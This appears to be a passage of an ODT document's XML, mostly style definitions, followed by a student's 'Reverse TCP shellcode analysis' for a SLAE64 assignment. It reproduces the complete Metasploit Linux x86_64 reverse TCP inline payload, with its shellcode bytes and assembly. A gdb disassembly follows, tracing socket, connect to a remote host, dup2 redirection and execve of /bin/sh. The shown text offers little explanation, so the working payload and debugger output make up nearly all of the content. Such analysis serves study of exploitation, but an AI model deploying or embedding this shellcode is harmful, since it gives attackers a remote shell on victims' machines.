      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#0066cc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29" style:family="text">
      <style:text-properties fo:color="#0066cc" officeooo:rsid="00207260"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:color="#009900" officeooo:rsid="001a6929"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0016f455" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="001a6929" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="00207260" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" officeooo:rsid="0011ef1f" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" officeooo:rsid="00183548" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="00183548" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="00190ee3" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="001a6929" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="00183548" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties fo:color="#000000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46" style:family="tex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47" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00138d2d" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties fo:color="#000000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49" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0012d1a6" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00183548" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00138d2d" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T54" style:family="text"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T55" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00183548" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00190ee3" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001a6929" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="normal" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00183548" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="000f46fd" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00114058" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0011ef1f" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T69" style:family="tex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70" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00207260" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00207260" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7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6" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0011ef1f" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties officeooo:rsid="0004c335"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001af893" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties officeooo:rsid="0016f455"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties officeooo:rsid="001a6929"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties officeooo:rsid="001be81b"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties officeooo:rsid="001f9189"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001a6929" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00207260" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties officeooo:rsid="00207260"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties officeooo:rsid="002121be"/>
    </style:style>
    <style:style style:name="gr1" style:family="graphic">
      <style:graphic-properties svg:stroke-width="0.0402in" draw:marker-start-width="0.2602in" draw:marker-end-width="0.2602in" draw:fill="none" draw:textarea-horizontal-align="center" draw:textarea-vertical-align="middle" fo:padding-top="0.0201in" fo:padding-bottom="0.0201in" fo:padding-left="0.0201in" fo:padding-right="0.0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text:tab/><text:tab/><text:tab/><text:span text:style-name="T2">Reverse TCP shellcode analysis <text:s/>, </text:span><text:span text:style-name="T3">slae64 - 1337</text:span></text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P2">Code in metasploit file:</text:p>
      <text:p text:style-name="P50"><draw:rect text:anchor-type="paragraph" draw:z-index="0" draw:style-name="gr1" draw:text-style-name="P76" svg:width="6.826in" svg:height="9.5713in" svg:x="-0.1126in" svg:y="0.1547in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P3">## </text:p>
      <text:p text:style-name="P3"># This module requires Metasploit: http//metasploit.com/download </text:p>
      <text:p text:style-name="P3"># Current source: https://github.com/rapid7/metasploit-framework </text:p>
      <text:p text:style-name="P3">## </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">require 'msf/core' </text:p>
      <text:p text:style-name="P3">require 'msf/core/handler/reverse_tcp' </text:p>
      <text:p text:style-name="P3">require 'msf/base/sessions/command_shell' </text:p>
      <text:p text:style-name="P3">require 'msf/base/sessions/command_shell_options' </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">module Metasploit3 </text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>include Msf::Payload::Single </text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>include Msf::Payload::Linux </text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>include Msf::Sessions::CommandShellOptions </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:s text:c="2"/>def initialize(info = {}) </text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/>super(merge_info(info, </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Name' <text:s text:c="9"/>=&gt; 'Linux Command Shell, Reverse TCP Inline', </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Description' <text:s text:c="2"/>=&gt; 'Connect back to attacker and spawn a command shell', </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Author' <text:s text:c="7"/>=&gt; 'ricky', </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'License' <text:s text:c="6"/>=&gt; MSF_LICENSE, </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Platform' <text:s text:c="5"/>=&gt; 'linux', </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Arch' <text:s text:c="9"/>=&gt; ARCH_X86_64, </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Handler' <text:s text:c="6"/>=&gt; Msf::Handler::ReverseTcp, </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Session' <text:s text:c="6"/>=&gt; Msf::Sessions::CommandShellUnix, </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>'Payload' <text:s text:c="6"/>=&gt; </text:p>
      <text:p text:style-name="P3"><text:s text:c="8"/>{ </text:p>
      <text:p text:style-name="P3"><text:s text:c="10"/>'Offsets' =&gt; </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>{ </text:p>
      <text:p text:style-name="P3"><text:s text:c="14"/>'LHOST' =&gt; [ 20, 'ADDR' ], </text:p>
      <text:p text:style-name="P3"><text:s text:c="14"/>'LPORT' =&gt; [ 18, 'n' <text:s text:c="3"/>], </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>}, </text:p>
      <text:p text:style-name="P3"><text:s text:c="10"/>'Payload' =&gt; </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x29" <text:s text:c="20"/>+ # pushq <text:s/>$0x29 </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x58" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rax </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x99" <text:s text:c="24"/>+ # cltd </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x02" <text:s text:c="20"/>+ # pushq <text:s/>$0x2 </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x5f" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rdi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x01" <text:s text:c="20"/>+ # pushq <text:s/>$0x1 </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x5e" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rsi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x0f\x05" <text:s text:c="20"/>+ # syscall </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\x97" <text:s text:c="20"/>+ # xchg <text:s text:c="2"/>%rax,%rdi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\xb9\x02\x00" <text:s text:c="12"/>+ # movabs $0x100007fb3150002,%rcx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x15\xb3" <text:s text:c="20"/>+ # </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x7f\x00\x00\x01" <text:s text:c="12"/>+ # </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x51" <text:s text:c="24"/>+ # push <text:s text:c="2"/>%rcx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\x89\xe6" <text:s text:c="16"/>+ # mov <text:s text:c="3"/>%rsp,%rsi </text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2"><text:s text:c="11"/></text:span><text:span text:style-name="T7"><text:s/>"\x6a\x10" <text:s text:c="20"/>+ # pushq <text:s/>$0x10 </text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x5a" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rdx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x2a" <text:s text:c="20"/>+ # pushq <text:s/>$0x2a </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x58" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rax </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x0f\x05" <text:s text:c="20"/>+ # syscall </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x03" <text:s text:c="20"/>+ # pushq <text:s/>$0x3 </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x5e" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rsi </text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2"><text:s text:c="10"/></text:span><text:span text:style-name="T7"><text:s text:c="2"/>"\x48\xff\xce" <text:s text:c="16"/>+ # dec <text:s text:c="3"/>%rsi </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2"><text:s text:c="12"/></text:span><text:span text:style-name="T7">"\x6a\x21" <text:s text:c="20"/>+ # pushq <text:s/>$0x21 </text:span></text:p>
      <text:p text:style-name="P50"><draw:rect text:anchor-type="paragraph" draw:z-index="1" draw:style-name="gr1" draw:text-style-name="P76" svg:width="6.826in" svg:height="3.0697in" svg:x="-0.1126in" svg:y="0.1547in"><text:p/></draw:rect><text:soft-page-break/> <text:s text:c="11"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T7">"\x58" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rax </text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x0f\x05" <text:s text:c="20"/>+ # syscall </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x75\xf6" <text:s text:c="20"/>+ # jne <text:s text:c="3"/>27 &lt;dup2_loop&gt; </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x6a\x3b" <text:s text:c="20"/>+ # pushq <text:s/>$0x3b </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x58" <text:s text:c="24"/>+ # pop <text:s text:c="3"/>%rax </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x99" <text:s text:c="24"/>+ # cltd </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x73\x68\x00" <text:s text:c="16"/>+ # </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x53" <text:s text:c="24"/>+ # push <text:s text:c="2"/>%rbx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\x89\xe7" <text:s text:c="16"/>+ # mov <text:s text:c="3"/>%rsp,%rdi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x52" <text:s text:c="24"/>+ # push <text:s text:c="2"/>%rdx </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x57" <text:s text:c="24"/>+ # push <text:s text:c="2"/>%rdi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x48\x89\xe6" <text:s text:c="16"/>+ # mov <text:s text:c="3"/>%rsp,%rsi </text:p>
      <text:p text:style-name="P3"><text:s text:c="12"/>"\x0f\x05" <text:s text:c="22"/># syscall </text:p>
      <text:p text:style-name="P3"><text:s text:c="8"/>} </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>)) </text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>end </text:p>
      <text:p text:style-name="P3">end</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P66">Code output <text:s/>with gdb :</text:p>
      <text:p text:style-name="P60"><draw:rect text:anchor-type="paragraph" draw:z-index="20" draw:style-name="gr1" draw:text-style-name="P76" svg:width="6.826in" svg:height="6.4906in" svg:x="-0.1126in" svg:y="0.0291in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P61"><text:s text:c="3"/><text:span text:style-name="T87"># gdb shellcode</text:span></text:p>
      <text:p text:style-name="P62">GNU gdb (GDB) 7.4.1-debian</text:p>
      <text:p text:style-name="P62">Copyright (C) 2012 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="P62">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="P62">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="P62">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="P62">and "show warranty" for details.</text:p>
      <text:p text:style-name="P62">This GDB was configured as "x86_64-linux-gnu".</text:p>
      <text:p text:style-name="P62">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="P62">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</text:p>
      <text:p text:style-name="P62">Reading symbols from /root/Desktop/ExamRev/Assignment5/Reverse_TCP/shellcode...(no debugging symbols found)...done.</text:p>
      <text:p text:style-name="P62">(gdb) b *&amp;code</text:p>
      <text:p text:style-name="P62">Breakpoint 1 at 0x600980</text:p>
      <text:p text:style-name="P62">(gdb) set disassembly-flavor intel </text:p>
      <text:p text:style-name="P62">(gdb) r</text:p>
      <text:p text:style-name="P62">Starting program: /root/Desktop/ExamRev/Assignment5/Reverse_TCP/shellcode </text:p>
      <text:p text:style-name="P62">Shellcode Length: <text:s/>17</text:p>
      <text:p text:style-name="P62"></text:p>
      <text:p text:style-name="P62">Breakpoint 1, 0x0000000000600980 in code ()</text:p>
      <text:p text:style-name="P62">(gdb) disassemble </text:p>
      <text:p text:style-name="P62">Dump of assembler code for function code:</text:p>
      <text:p text:style-name="P62">=&gt; 0x0000000000600980 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>0x29</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600982 &lt;+2&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600983 &lt;+3&gt;:<text:tab/>cdq <text:s text:c="3"/></text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600984 &lt;+4&gt;:<text:tab/>push <text:s text:c="2"/>0x2</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600986 &lt;+6&gt;:<text:tab/>pop <text:s text:c="3"/>rdi</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600987 &lt;+7&gt;:<text:tab/>push <text:s text:c="2"/>0x1</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600989 &lt;+9&gt;:<text:tab/>pop <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060098a &lt;+10&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060098c &lt;+12&gt;:<text:tab/>xchg <text:s text:c="2"/>rdi,rax</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060098e &lt;+14&gt;:<text:tab/>movabs rcx,0x8e0ba8c05c110002</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600998 &lt;+24&gt;:<text:tab/>push <text:s text:c="2"/>rcx</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x0000000000600999 &lt;+25&gt;:<text:tab/>mov <text:s text:c="3"/>rsi,rsp</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060099c &lt;+28&gt;:<text:tab/>push <text:s text:c="2"/>0x10</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060099e &lt;+30&gt;:<text:tab/>pop <text:s text:c="3"/>rdx</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x000000000060099f &lt;+31&gt;:<text:tab/>push <text:s text:c="2"/>0x2a</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009a1 &lt;+33&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009a2 &lt;+34&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P62"><draw:rect text:anchor-type="paragraph" draw:z-index="25" draw:style-name="gr1" draw:text-style-name="P76" svg:width="6.826in" svg:height="3.2217in" svg:x="-0.1126in" svg:y="-0.0445in"><text:p/></draw:rect><text:soft-page-break/> <text:s text:c="2"/>0x00000000006009a4 &lt;+36&gt;:<text:tab/>push <text:s text:c="2"/>0x3</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009a6 &lt;+38&gt;:<text:tab/>pop <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009a7 &lt;+39&gt;:<text:tab/>dec <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009aa &lt;+42&gt;:<text:tab/>push <text:s text:c="2"/>0x21</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009ac &lt;+44&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009ad &lt;+45&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009af &lt;+47&gt;:<text:tab/>jne <text:s text:c="3"/>0x6009a7 &lt;code+39&gt;</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009b1 &lt;+49&gt;:<text:tab/>push <text:s text:c="2"/>0x3b</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009b3 &lt;+51&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009b4 &lt;+52&gt;:<text:tab/>cdq <text:s text:c="3"/></text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009b5 &lt;+53&gt;:<text:tab/>movabs rbx,0x68732f6e69622f</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009bf &lt;+63&gt;:<text:tab/>push <text:s text:c="2"/>rbx</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009c0 &lt;+64&gt;:<text:tab/>mov <text:s text:c="3"/>rdi,rsp</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009c3 &lt;+67&gt;:<text:tab/>push <text:s text:c="2"/>rdx</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009c4 &lt;+68&gt;:<text:tab/>push <text:s text:c="2"/>rdi</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009c5 &lt;+69&gt;:<text:tab/>mov <text:s text:c="3"/>rsi,rsp</text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009c8 &lt;+72&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P62"><text:s text:c="3"/>0x00000000006009ca &lt;+74&gt;:<text:tab/>add <text:s text:c="3"/>BYTE PTR [rax],al</text:p>
      <text:p text:style-name="P62">End of assembler dump.</text:p>
